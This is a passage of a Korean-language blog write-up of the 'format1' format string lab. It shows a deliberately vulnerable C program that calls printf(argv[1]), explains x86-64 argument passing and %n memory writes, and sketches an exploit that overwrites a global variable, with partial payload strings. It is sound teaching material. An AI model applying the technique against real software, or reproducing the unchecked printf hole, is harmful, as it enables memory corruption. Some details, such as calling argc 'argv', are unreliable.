        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%c  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt; 포인터  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; 1byte 한 글자  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;…  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;  …  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; …  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;위 포맷 스트링 중 가장 중요한 건 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%x&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 이다.&lt;/li&gt;
  &lt;li&gt;특히 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 의 경우, 메모리 주소를 가리키는 포인터를 인자로 받기 때문에 32비트 환경에서는 4바이트, 64비트 환경에서는 8 바이트를 한 번에 읽어서 주소로 사용한다는 점 잊지 말기!
&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;1-예제-코드-분석&quot;&gt;1. 예제 코드 분석&lt;/h1&gt;

&lt;p&gt;주어진 코드는 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt; 
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;you have modified the target :)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;사용자에게서 프로그램의 argument로 입력받은 값을 문자열의 형태로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; 함수에게 넘겨준다.&lt;/p&gt;

&lt;p&gt;해당 문자열은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt;에서 즉석으로 호명되며, 이후 프로그램의 control flow는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 내부로 흘러들어가게 되고, 해당 함수 내에서 입력된 문자열과 format string이 처리된다.&lt;/p&gt;

&lt;p&gt;format string bug는 바로 이 지점, 즉 프로그램이 컴파일되어 실행되는 시점과 사용자 입력을 처리하여 알맞은 행위를 취하는 시점의 시차에서 발생한다.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-익스플로잇&quot;&gt;2. 익스플로잇&lt;/h1&gt;

&lt;p&gt;익스플로잇은 아래의 단계로 구성된다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;프로그램 분석해 취약점 확정&lt;/li&gt;
  &lt;li&gt;취약점을 익스플로잇할 방법 지정&lt;/li&gt;
  &lt;li&gt;익스플로잇 생성 및 실행&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;먼저 주어진 프로그램을 익스플로잇했을 때 성취해야 할 목적은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수를 0 이외의 것으로 변경하는 것이다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수는 global int로 uninitialized 이기 때문에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bss&lt;/code&gt; 영역에 저장될 것이고, 전역변수인 이상 컴파일 당시 컴파일러에 의해 0으로 자동 초기화될 것이기 때문이다.&lt;/p&gt;

&lt;p&gt;앞에서 프로그램 분석과 취약점 확정을 마무리했으므로, 2) 취약점 익스플로잇 방법 확정부터 시작한다.&lt;/p&gt;

&lt;h2 id=&quot;21-취약점-익스플로잇-방법-지정&quot;&gt;2.1. 취약점 익스플로잇 방법 지정&lt;/h2&gt;

&lt;h3 id=&quot;211-배경-설명&quot;&gt;2.1.1. 배경 설명&lt;/h3&gt;

&lt;p&gt;64bit 프로그램에서 아래와 같은 printf 구문이 함수 내에 있을 때 printf가 변수를 참조하는 방식에 대해 자세히 알아보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위의 코드 라인이 진행되면 결론적으로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf(&apos;%p.%x.%c.%d.%f.%h.%n&apos;)&lt;/code&gt; 가 실행되는데, 이때 주의깊게 봐야 할 것은 64비트 프로그램에서 함수에 인자를 전달할 때 레지스터와 스택의 사용 방식이다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;리눅스용 gcc는 64비트 컴파일 시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fastcall&lt;/code&gt; 이라는 calling convention을 사용하는데, 이 규약 하에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi, rsi, rdx, rcx, r8, r9&lt;/code&gt; 순으로 인자가 들어가고 남아있는 인자는 스택에 마지막 인자부터 push하여 이후 스택에서 인자를 pop할 때 순서대로 pop되도록 한다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 함수에서 인자는 어떤 식으로 전달될까? 익스플잇할 대상 프로그램에 직접 디버거를 붙여 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; , 즉 첫 번째 인자로 프린트할 스트링의 시작 주소가 주어졌고&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; , 즉 두번째 인자로 현재 프로세스의 적재 위치가 주어졌다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;만일 대상 프로그램에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf(string)&lt;/code&gt; 이 아닌 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf(string, 0xDEADBEEF, ... , 0xCAFECAFE)&lt;/code&gt; 등의 형식으로 여러 인자를 전달했다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; 는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xDEADBEEF&lt;/code&gt; … 식이 되었을 것이다.&lt;/p&gt;

&lt;p&gt;이처럼, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 함수는 프린트할 스트링의 시작주소를 무조건 첫 번째 인자로 받고, 해당 스트링에 포맷 스트링이 6개 포함되어 있을 경우 함수의 인자 규칙과 calling convention에 따라 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcx&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r9&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack&lt;/code&gt; 을 각 포맷 스트링에 대해 순서대로 참조한다. 이 사실을 기반으로 다시 한 번 예시를 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf(buf)&lt;/code&gt; 가 인자를 사용하기 위해 레지스트리와 스택을 참조하는 순서는 아래와 같을 것이다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt;: &amp;amp;buf&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;: some hex value → %p에 주어질 포인터로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt;:  ‘’ → %x에 주어질 값으로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcx&lt;/code&gt;:  ‘’ → %c에 주어질 포인터로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt;:  ‘’ → %d에 주어질 값으로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r9&lt;/code&gt;:  ‘’ → %f에 주어질 값으로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack&lt;/code&gt;:  ‘’ → %h에 주어질 값으로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack(next address)&lt;/code&gt;:  ‘’ → %n에 주어질 포인터로서 참조&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이제 언급된 포맷 스트링 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt;에 대해 자세히 알아보자. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 은 인자로서 어떤 메모리의 주소(포인터)를 받는다. 이렇게 받은 포인터가 가리키는 메모리에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 은 자신이 나오기 전까지 입력된 문자의 개수를 입력한다.&lt;/p&gt;

&lt;p&gt;포맷 스트링 중 유일하게 메모리 값을 변조하는 것이 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 포맷 스트링이기 때문에 이는 익스플로잇에 매우 자주 이용된다.&lt;/p&gt;

&lt;h3 id=&quot;212-익스플로잇-설계&quot;&gt;2.1.2. 익스플로잇 설계&lt;/h3&gt;

&lt;p&gt;앞서 설명한 내용의 요점은 아래와 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;64비트 프로그램의 Calling Convention을 고려했을 때, 입력값을 검증하지 않고 사용하는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf()&lt;/code&gt; 함수에게 format string을 많이 주어 스택에 순차적으로 접근할 수 있다.&lt;/li&gt;
  &lt;li&gt;포맷 스트링 중 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 만이 유일하게 사용자의 입력값을 반영하여 인자로 주어진 포인터가 가리키는 메모리 값을 변조한다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;따라서 아래와 같이 익스플로잇의 개념을 설계할 수 있다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;충분히 많은 format string을 사용하여 스택에 접근할 수 있도록 한 뒤, 마지막으로 사용된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; format string이 참조할 스택 위치에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수의 주소가 들어가도록 한다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 은 결론적으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수의 값을 이제까지 받은 character의 수로 변조하게 될 것이다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;말로만 하니 이해가 힘들 수 있다. 그림을 보면서 이해해 보자.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;주의:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 은 사실 아래 그림과 같은 식으로 존재하지 않는다. 아무래도 이중 배열이니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[0]&lt;/code&gt; 이 진짜로 있는 곳 바로 아래에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; 이 있고, 그게 가리키는 곳에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 이 있을 거라… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 의 스택 프레임 내부에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 이 보일 리가 없다. 그러나 설명의 용이를 위해 아래와 같이 그린 점 감안해 주십사…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; 함수가 콜되었을 때의 스택 프레임이다. 함수를 시작할 때 패스했던 인자의 시작 주소는 이중 배열인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv&lt;/code&gt; 의 두 번째 인덱스에 저장되고, 이 시작 주소 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln()&lt;/code&gt; 함수에게 인자로 전달된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그리고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln()&lt;/code&gt; 스택 프레임 안에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf()&lt;/code&gt; 함수를 콜했을 때의 스택 프레임이다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf()&lt;/code&gt; 에게 첫 번째 인자로 주어진 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt;, 실제로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 가 포인터의 형태로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 에 들어간 것을 확인할 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;format1&lt;/code&gt; 프로그램에게 인자로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%5$p.%4$x.$n&lt;/code&gt; 을 준다면 어떻게 될까? 아래 사진은 읽어들인 내용이 모두 보이도록 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%{int}${format}&lt;/code&gt; 의 형식을 취하지 않았고, 균일한 형식으로 보이게 하기 위해 동일한 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%p&lt;/code&gt; 포맷 스트링을 사용했으나 개수를 기준으로 설명하겠다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;직전의 스택 프레임 사진을 고려하면&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;출력할 스트링의 시작주소를 담고 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 를 제외한 나머지 5개의 레지스터에 저장된 값을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%p&lt;/code&gt; 포맷 스트링이 읽어들이고&lt;/li&gt;
  &lt;li&gt;스택에 저장된 값을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fastcall&lt;/code&gt; calling convention에 따라 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt;의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp(sfp)&lt;/code&gt; 를 뛰어넘어서 바로 아래에 있던 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln()&lt;/code&gt;의 스택 4개 주소를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%x&lt;/code&gt;가 읽어온 것(스택 사진과 값이 다른 점이 있으나 이건 다른 시점에 찍어서 그렇다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vsprintf&lt;/code&gt; 를 내부적으로 콜하고 그 안에서 stdout이 이루어지는 것 같은데 거기까지 가서 찾기는 좀… 그래…)&lt;/li&gt;
  &lt;li&gt;조금 논외로, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln()&lt;/code&gt; 의 스택 프레임을 그린 사진과 바로 위에서 확인되는 실제 스택 프레임의 구조가 다른데, 내가 알기로는… 컴파일 당시 컴파일러는 최적화를 위해 로컬변수선언이 안된 함수의 경우 외부에서 받아온 인자를 굳이 스택에 저장하지 않는데 왜 저장했는지 모르겠다. 이걸 어디에서 찾아야 할지 감이 안 와&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;을 확인할 수 있다.&lt;/p&gt;

&lt;p&gt;따라서 마지막에 사용된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdfa0&lt;/code&gt; 주소 안에 있는 값을 메모리 주소로 생각하고 해당 주소에 자신이 나오기 전까지 출력됐던 글자수를 입력할 것이다.&lt;/p&gt;

&lt;p&gt;즉, 이 익스플로잇의 요지는 아래와 같다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 이 읽어올 메모리 주소 안의 값이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수의 주소가 되도록 하는 것.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;위의 목적은 사용자가 변조할 수 있는 유일한 위치, 즉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수의 주소를 주고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 에 접근하게 함으로써 성취할 수 있다.&lt;/p&gt;

&lt;p&gt;그렇다면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 은 대체 어디에 있고 얼마나 많은 스택의 주소를 읽어야 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 에 접근할 수 있을까?&lt;/p&gt;

&lt;p&gt;이를 알기 위해 pwndbg를 붙여 main을 디스어셈블해서 전체적인 흐름을 파악하고 실제로 실행해서 스택 구성이 어떻게 되었는지 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%206.jpeg&quot; alt=&quot;main 함수의 디스어셈블 결과.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main 함수의 디스어셈블 결과.&lt;/p&gt;

&lt;p&gt;하얗게 하이라이트가 된 부분이 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[0][0]&lt;/code&gt; 의 위치다. 바로 위의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x4&lt;/code&gt; 는 확보한 공간으로 미루어볼 때 int type인 argv일 것이다. 그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 은 아마 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[0][0]&lt;/code&gt; 의 바로 다음 바이트에 있을 것이다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv&lt;/code&gt; 는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char **&lt;/code&gt; 타입이기 때문이다. 그렇다면 당연히 확보 공간도 1바이트겠지!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

